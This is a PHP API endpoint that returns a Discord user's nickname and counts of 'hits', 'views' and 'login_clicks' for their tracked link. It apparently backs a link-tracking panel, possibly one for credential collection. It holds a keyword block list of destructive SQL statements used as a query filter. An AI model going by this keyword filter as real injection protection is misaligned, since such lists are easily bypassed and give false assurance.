<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Cache-Control: no-store');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

$discordId = $_GET['user'] ?? '';
if (!is_string($discordId) || trim($discordId) === '') {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'user parameter required']);
    exit;
}
$discordId = trim($discordId);

require __DIR__ . '/../../libs/configuration.php';
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
require __DIR__ . '/../../libs/connection.php';

$userRow = executeSafeQuery(
    "SELECT discord_username, link_id FROM regular WHERE discord_id = :did LIMIT 1",
    [':did' => $discordId]
);

if (!is_array($userRow) || empty($userRow)) {
    http_response_code(404);
    echo json_encode(['success' => false, 'error' => 'User not found']);
    exit;
}

$nickname = $userRow[0]['discord_username'] ?? '';
$linkId = $userRow[0]['link_id'] ?? '';

$stats = executeSafeQuery(
    "SELECT
        (SELECT COUNT(*) FROM hits WHERE link_id = :lid1) as hits_total,
        (SELECT COUNT(*) FROM views WHERE link_id = :lid2) as visits_total,
        (SELECT COUNT(*) FROM login_clicks WHERE link_id = :lid3) as clicks_total",
    [':lid1' => $linkId, ':lid2' => $linkId, ':lid3' => $linkId]
);

$hits = 0;
$visits = 0;
$clicks = 0;
if (is_array($stats) && !empty($stats)) {
    $hits = (int)($stats[0]['hits_total'] ?? 0);
    $visits = (int)($stats[0]['visits_total'] ?? 0);
    $clicks = (int)($stats[0]['clicks_total'] ?? 0);
}

echo json_encode([
    'success' => true,
    'nickname' => $nickname,
    'stats' => [
        'hits' => $hits,
        'visits' => $visits,
        'clicks' => $clicks,
    ],
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);